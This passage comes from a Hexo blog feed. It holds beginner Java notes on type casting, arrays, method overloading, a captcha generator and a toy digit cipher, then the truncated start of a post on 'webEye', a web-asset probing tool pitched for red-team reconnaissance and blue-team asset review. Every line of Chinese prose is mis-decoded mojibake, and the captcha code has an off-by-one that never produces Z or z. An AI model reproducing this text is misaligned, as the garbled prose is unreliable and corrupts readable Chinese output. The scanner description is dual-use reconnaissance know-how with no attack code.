title="å¼ºåˆ¶ç±»å‹è½¬æ¢"></a><strong>å¼ºåˆ¶ç±»å‹è½¬æ¢</strong></h4><p>è¯­æ³•ï¼š<code>æ•°æ®ç±»å‹ å˜é‡2 = (æ•°æ®ç±»å‹) å˜é‡1</code></p><p>åº•å±‚åŸç†ï¼šä»¥int -&gt; byteä¸ºä¾‹ï¼Œå°†intçš„äºŒè¿›åˆ¶å8ä½ï¼Œç›´æ¥æ”¾åœ¨byteçš„8ä½äºŒè¿›åˆ¶ä¸Š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055072.png" alt="screen_2021-10-23_21-39-03"></p><p>ä»£ç å—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*3ã€å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line"><span class="comment">* ä»¥int -&gt; byteä¸ºä¾‹ï¼Œå°†intçš„äºŒè¿›åˆ¶å8ä½ï¼Œç›´æ¥æ”¾åœ¨byteçš„8ä½ä¸Š</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forceTypeConversion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;å¼ºåˆ¶ç±»å‹è½¬æ¢è¾“å‡ºï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">byte</span> c = (<span class="keyword">byte</span>)a; <span class="comment">//è¾“å‡º10</span></span><br><span class="line">    <span class="keyword">byte</span> d = (<span class="keyword">byte</span>)b; <span class="comment">//è¾“å‡º-24</span></span><br><span class="line">    System.out.printf(<span class="string">&quot;c: %d\nd: %s\n&quot;</span>, c, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¼ºåˆ¶ï¼›ç±»å‹è½¬æ¢å¯èƒ½é€ æˆæ•°æ®æº¢å‡ºï¼ˆä¸¢å¤±ï¼‰</p><h3 id="2ã€æ•°ç»„"><a href="#2ã€æ•°ç»„" class="headerlink" title="2ã€æ•°ç»„"></a>2ã€æ•°ç»„</h3><h4 id="é™æ€å®šä¹‰"><a href="#é™æ€å®šä¹‰" class="headerlink" title="é™æ€å®šä¹‰"></a>é™æ€å®šä¹‰</h4><p>å®Œæ•´ç‰ˆï¼š<code>int[] a = new int[]&#123;1ï¼Œ 2ï¼Œ 3ï¼Œ 4&#125;;</code></p><p>ç®€åŒ–ç‰ˆï¼š<code>int[] a = &#123;1, 2, 3, 4&#125;;</code></p><p>å¯è§å…¶å®æ•°ç»„æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p><h4 id="åŠ¨æ€å®šä¹‰åŠè®¿é—®"><a href="#åŠ¨æ€å®šä¹‰åŠè®¿é—®" class="headerlink" title="åŠ¨æ€å®šä¹‰åŠè®¿é—®"></a><strong>åŠ¨æ€å®šä¹‰åŠè®¿é—®</strong></h4><p><code>int[] a = new int[10];</code></p><p>è®¿é—®å¹¶èµ‹å€¼ä»£ç å—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;è¾“å…¥ç¬¬%dä½å­¦ç”Ÿå¹´é¾„ï¼š&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">            a[i] = scan.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;ç¬¬%dä½å­¦ç”Ÿå¹´é¾„ï¼š%d\n&quot;</span>, i + <span class="number">1</span>, a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055800.png" alt="image-20211023230701414"></p><h4 id="æ•°ç»„å†…å­˜åˆ†é…"><a href="#æ•°ç»„å†…å­˜åˆ†é…" class="headerlink" title="æ•°ç»„å†…å­˜åˆ†é…"></a>æ•°ç»„å†…å­˜åˆ†é…</h4><p>Javaå†…å­˜åˆ†ä¸ºä»¥ä¸‹ï¼š</p><ul><li>  <strong>æ ˆ</strong>ï¼šæ–¹æ³•è¿è¡Œæ—¶æ‰€è¿›å…¥çš„å†…å­˜ï¼Œå˜é‡ä¹Ÿæ˜¯å­˜åœ¨è¿™é‡Œ </li><li>  <strong>å †</strong>ï¼šnewå‡ºæ¥çš„å¯¹è±¡ä¼šå­˜åœ¨æ­¤å†…å­˜ç©ºé—´</li><li>  <strong>æ–¹æ³•åŒº</strong>ï¼šå­—èŠ‚ç æ–‡ä»¶åŠ è½½æ—¶è¿›å…¥çš„å†…å­˜ç©ºé—´ï¼ˆclassæ–‡ä»¶ï¼‰</li><li>  æœ¬åœ°æ–¹æ³•æ ˆ</li><li>  å¯„å­˜å™¨</li></ul><p>å®šä¹‰æ•°ç»„å˜é‡æ—¶åœ¨å †åŒºç”³è¯·è¿ç»­ç©ºé—´ï¼Œæ ˆåŒºçš„å˜é‡å­˜çš„æ˜¯æ•°ç»„åœ¨å †åŒºçš„é¦–åœ°å€ï¼Œå› æ­¤å¤šä¸ªå˜é‡æ¥æ”¶åŒä¸€æ•°ç»„æ—¶ï¼Œæ¥æ”¶çš„æ˜¯æ•°ç»„åœ°å€ã€‚</p><h3 id="3ã€æ–¹æ³•é‡è½½"><a href="#3ã€æ–¹æ³•é‡è½½" class="headerlink" title="3ã€æ–¹æ³•é‡è½½"></a>3ã€æ–¹æ³•é‡è½½</h3><p>å®šä¹‰ï¼šåŒä¸€ç±»ä¸­ï¼Œå‡ºç°å¤šä¸ªæ–¹æ³•åç§°ç›¸åŒï¼Œä½†æ˜¯å‚æ•°åˆ—è¡¨ä¸åŒï¼Œè¿™äº›æ–¹æ³•å°±æ˜¯é‡è½½æ–¹æ³•</p><p>é‡è½½æ–¹æ³•å¯ç›¸äº’è°ƒç”¨ï¼Œä»£ç å—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•é‡è½½ï¼š</span></span><br><span class="line"><span class="comment">// åŒä¸€ç±»ä¸­ï¼Œå‡ºç°å¤šä¸ªæ–¹æ³•åç§°ç›¸åŒï¼Œä½†æ˜¯å‚æ•°åˆ—è¡¨ä¸åŒï¼Œè¿™äº›æ–¹æ³•å°±æ˜¯é‡è½½æ–¹æ³•</span></span><br><span class="line"><span class="comment">// å½¢å‚åˆ—è¡¨ä¸åŒï¼šå½¢å‚çš„ä¸ªæ•°ã€é¡ºåºã€ç±»å‹ä¸åŒï¼Œä¸å…³å¿ƒå½¢å‚åç§°</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Method</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        fire();</span><br><span class="line">        fire(<span class="string">&quot;å²›å›½&quot;</span>);</span><br><span class="line">        fire(<span class="string">&quot;ç¾åˆ©åš&quot;</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é»˜è®¤å‘å°„1æšæ­¦å™¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">(String location)</span></span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;å‘&quot; + location + &quot;å‘å°„1æšæ­¦å™¨&quot;);</span></span><br><span class="line">        fire(<span class="string">&quot;å²›å›½&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">(String location, <span class="keyword">int</span> count)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å‘&quot;</span> + location + <span class="string">&quot;å‘å°„&quot;</span> + count + <span class="string">&quot;æšæ­¦å™¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°åˆ—è¡¨ä¸åŒï¼šå½¢å‚çš„ä¸ªæ•°ã€é¡ºåºã€ç±»å‹ä¸åŒï¼Œä¸å…³å¿ƒå½¢å‚åç§°ã€‚</p><p>é‡è½½æ–¹æ³•åˆ¤æ–­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">()</span> </span>&#123;&#125; <span class="comment">//æ–°æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;&#125; <span class="comment">//é‡è½½æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">double</span> b)</span> </span>&#123;&#125; <span class="comment">//é‡è½½æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">double</span> b, <span class="keyword">int</span> a)</span> </span>&#123;&#125; <span class="comment">//é‡è½½æ–¹æ³•</span></span><br><span class="line"><span class="comment">// public static void find(int b, double a) &#123;&#125; //æŠ¥é”™ï¼Œå·²å­˜åœ¨</span></span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä»£ç ç¼–å†™"><a href="#ä¸‰ã€ä»£ç ç¼–å†™" class="headerlink" title="ä¸‰ã€ä»£ç ç¼–å†™"></a>ä¸‰ã€ä»£ç ç¼–å†™</h2><h3 id="1ã€ç”ŸæˆéªŒè¯ç "><a href="#1ã€ç”ŸæˆéªŒè¯ç " class="headerlink" title="1ã€ç”ŸæˆéªŒè¯ç "></a>1ã€ç”ŸæˆéªŒè¯ç </h3><p>CreateCode.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”ŸæˆéªŒè¯ç </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateCode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;éªŒè¯ç ä½æ•°ï¼š&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> length = scanner.nextInt();</span><br><span class="line">            String code = createCode(length);</span><br><span class="line">            System.out.println(<span class="string">&quot;ç”Ÿæˆçš„éªŒè¯ç ï¼š&quot;</span> + code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createCode</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        String code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">// å¤§å†™å­—æ¯ã€å°å†™å­—æ¯ã€æ•°å­—ï¼ˆ0 1 2ï¼‰</span></span><br><span class="line">            <span class="keyword">int</span> typeCode = random.nextInt(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">if</span> (typeCode == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// å¤§å†™å­—æ¯(A:65  Z:65+25) å³ (0, 25) + 65</span></span><br><span class="line">                code += (<span class="keyword">char</span>) (random.nextInt(<span class="number">25</span>) + <span class="number">65</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (typeCode == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// å°å†™å­—æ¯(a:97  z:97+25) å³ (0, 25) + 97</span></span><br><span class="line">                code += (<span class="keyword">char</span>) (random.nextInt(<span class="number">25</span>) + <span class="number">97</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (typeCode == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="comment">// æ•°å­—(0 9)</span></span><br><span class="line">                code += (random.nextInt(<span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055677.png" alt="image-20211024183444652"></p><p>ç›¸å…³çŸ¥è¯†ç‚¹ï¼š</p><ol><li> Randomç±»å’ŒScannerç±»çš„ä½¿ç”¨</li></ol><h3 id="2ã€æ•°å­—åŠ è§£å¯†"><a href="#2ã€æ•°å­—åŠ è§£å¯†" class="headerlink" title="2ã€æ•°å­—åŠ è§£å¯†"></a>2ã€æ•°å­—åŠ è§£å¯†</h3><p>è¦æ±‚ï¼šä¸€ä¸²æ•°å­—ï¼Œæ¯ä½åŠ 5ï¼Œå–ä½™10ï¼Œå†å°†ç»“æœåè½¬ï¼Œå¾—åˆ°å¯†æ–‡ï¼Œå¹¶è¿˜åŸå‡ºæ˜æ–‡</p><p>Encrypt.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Sma11New</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Github</span> https://github.com/Sma11New</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°å­—åŠ è§£å¯†ç»ƒä¹ </span></span><br><span class="line"><span class="comment">/*ä¸€ä¸²æ•°å­—ï¼Œæ¯ä½åŠ 5ï¼Œå–ä½™10ï¼Œå†å°†ç»“æœåè½¬ï¼Œå¾—åˆ°å¯†æ–‡*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.printf(<span class="string">&quot;è¾“å…¥æ˜æ–‡æ•°å­—åºåˆ—ï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> msg = scanner.nextInt();</span><br><span class="line">        String encryptResult = encrypt(intToString(msg));</span><br><span class="line">        System.out.println(<span class="string">&quot;åŠ å¯†ç»“æœï¼š&quot;</span> + encryptResult);</span><br><span class="line">        <span class="keyword">int</span> decryptResult = stringToInt(decrypt(encryptResult));</span><br><span class="line">        System.out.println(<span class="string">&quot;è§£å¯†ç»“æœï¼š&quot;</span> + decryptResult);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//åŠ å¯†</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        String encryptResult = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span>[] msgArray = msg.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line"><span class="comment">//            int msgArrayI = msgArray[i] - &#x27;0&#x27;; //charè½¬int</span></span><br><span class="line">            <span class="keyword">int</span> msgArrayI = Character.getNumericValue(msgArray[i]); <span class="comment">//charè½¬int</span></span><br><span class="line">            <span class="keyword">int</span> operationResult = (msgArrayI + <span class="number">5</span>) % <span class="number">10</span>;</span><br><span class="line">            msgArray[i] = (<span class="keyword">char</span>)(operationResult + <span class="number">48</span>); <span class="comment">// intæ•°å­—è½¬char</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            encryptResult += msgArray[msgArray.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encryptResult;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è§£å¯†</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        String decryptResult = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span>[] msgArray = msg.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            <span class="comment">/*if (Character.getNumericValue(msgArray[i]) &gt;= 5)&#123;</span></span><br><span class="line"><span class="comment">                msgArray[i] = (char)(Character.getNumericValue(msgArray[i]) - 5 + 48);</span></span><br><span class="line"><span class="comment">            &#125;else &#123;</span></span><br><span class="line"><span class="comment">                msgArray[i] = (char)(Character.getNumericValue(msgArray[i]) + 5 + 48);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">            <span class="comment">// ä¸‰ç›®è¿ç®—ç¬¦ï¼Œæ•ˆæœåŒä¸Šæ³¨é‡Š</span></span><br><span class="line">            msgArray[i] = (Character.getNumericValue(msgArray[i]) &gt;= <span class="number">5</span>) ?</span><br><span class="line">            ((<span class="keyword">char</span>)(Character.getNumericValue(msgArray[i]) - <span class="number">5</span> + <span class="number">48</span>)) :</span><br><span class="line">            ((<span class="keyword">char</span>)(Character.getNumericValue(msgArray[i]) + <span class="number">5</span> + <span class="number">48</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            decryptResult += msgArray[msgArray.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decryptResult;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//intè½¬æ¢ä¸ºString</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">intToString</span><span class="params">(<span class="keyword">int</span> msg)</span></span>&#123;</span><br><span class="line">        String result = <span class="string">&quot;&quot;</span> + msg;</span><br><span class="line">        <span class="comment">// String result = Integer.toString(msg);</span></span><br><span class="line">        <span class="comment">// String result = String.valueOf(msg);</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Stringè½¬æ¢ä¸ºint</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stringToInt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = Integer.parseInt(msg);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055915.png" alt="image-20211025002726563"></p><p>ç›¸å…³çŸ¥è¯†ç‚¹ï¼š</p><ol><li> charå’Œintçš„ç›¸äº’è½¬æ¢</li><li> Stringç±»å‹è½¬æ¢ä¸ºæ•°ç»„</li><li> ä¸‰ç›®è¿ç®—ç¬¦è¦åœ¨æœ€å‰è¾¹å†™æ¥æ”¶å˜é‡ï¼š<code>n = (a &gt; b) ? a : b;</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå­¦ä¹ ä¹‹è·¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·ç¯‡ã€‘webEye - webèµ„äº§æ¢æµ‹å·¥å…·</title>
      <link href="post/202110102133.html"/>
      <url>post/202110102133.html</url>
      
        <content type="html"><![CDATA[<p><strong>webEyeå·¥å…·ä¸“é¡¹äºipå¯¹åº”webèµ„äº§æ¢æµ‹ï¼Œå¯ç”¨äºçº¢é˜Ÿä¿¡æ¯æœé›†ã€è“é˜Ÿå†…ç½‘webèµ„äº§æ¢æµ‹æ¢³ç†ã€‚</strong></p><h2 id="ğŸæ›´æ–°æ—¥å¿—"><a href="#ğŸæ›´æ–°æ—¥å¿—" class="headerlink" title="ğŸæ›´æ–°æ—¥å¿—"></a>ğŸæ›´æ–°æ—¥å¿—</h2><h4 id="2021-10-10-v2-1-ï¼š"><a href="#2021-10-10-v2-1-ï¼š" class="headerlink" title="2021-10-10 (v2.1)ï¼š"></a><strong>2021-10-10 <code>(v2.1)</code>ï¼š</strong></h4><ul><li>  å› æ•ˆæœä¸ä½³ï¼Œåˆ é™¤ICPå¤‡æ¡ˆæŸ¥è¯¢åŠŸèƒ½</li><li>  ä¼˜åŒ–æ•°æ®è¾“å…¥è¾“å‡ºï¼ŒåŠ å…¥è§£æå¤šç§ipå’Œportæ ¼å¼ï¼Œå¢åŠ æ”¯æŒ-p/â€“ipå‚æ•°ç›´æ¥è¾“å…¥ç›®æ ‡ip/ipæ®µ</li><li>  ä¿®æ”¹å†™å…¥æ–‡ä»¶æ–¹å¼ä¸ºåˆ†æ®µå¼ï¼Œå‡å°‘èµ„æºå ç”¨</li><li>  åŠ å…¥ä»»åŠ¡è¿›åº¦æ˜¾ç¤ºï¼Œæ›´åŠ ç›´è§‚</li><li>  ä¿®å¤å·²çŸ¥é—®é¢˜</li></ul><h4 id="2021-08-08-v2-0-ï¼š"><a href="#2021-08-08-v2-0-ï¼š" class="headerlink" title="2021-08-08 (v2.0)ï¼š"></a><strong>2021-08-08 <code>(v2.0)</code>ï¼š</strong></h4><ul><li>  ä¿®æ”¹é¡¹ç›®åä¸ºwebEye</li><li>  åŠ å…¥ICPå¤‡æ¡ˆæŸ¥è¯¢</li></ul><h4 id="2021-02-13-v1-0-ï¼š"><a href="#2021-02-13-v1-0-ï¼š" class="headerlink" title="2021-02-13 (v1.0)ï¼š"></a><strong>2021-02-13 <code>(v1.0)</code>ï¼š</strong></h4><ul><li>  åˆ›å»ºé¡¹ç›®GetWebSiteTitle</li><li>  å¯è¯»å–æ–‡ä»¶ipåˆ—è¡¨è¿›è¡Œç®€å•çš„webèµ„äº§æ¢æµ‹</li></ul><h2 id="ğŸ“åŠŸèƒ½ç®€è¿°"><a href="#ğŸ“åŠŸèƒ½ç®€è¿°" class="headerlink" title="ğŸ“åŠŸèƒ½ç®€è¿°"></a>ğŸ“åŠŸèƒ½ç®€è¿°</h2><p><strong>webEyeå·¥å…·ä¸“é¡¹äºipå¯¹åº”webèµ„äº§æ¢æµ‹ï¼Œå¯ç”¨äºçº¢é˜Ÿä¿¡æ¯æœé›†ã€è“é˜Ÿå†…ç½‘webèµ„äº§æ¢æµ‹æ¢³ç†ï¼Œç›®å‰åŠŸèƒ½åŠè¦ç‚¹ï¼š</strong></p><ol><li> æ‰¹é‡IPçš„å¤šä¸ªç«¯å£ä¸ŠWeb<strong>å­˜æ´»æ£€æµ‹</strong></li><li> è·å–å­˜æ´»web<strong>ç«™ç‚¹æ ‡é¢˜</strong></li><li> è·å–æŒ‡å®šå¤šä¸ªå“åº”ç çš„webèµ„äº§</li><li> ä½¿ç”¨<strong>çº¿ç¨‹æ± </strong>å¢åŠ è¯·æ±‚é€Ÿåº¦</li><li> æŸ¥è¯¢ç»“æœè¾“å‡ºè‡³<strong>Excelè¡¨æ 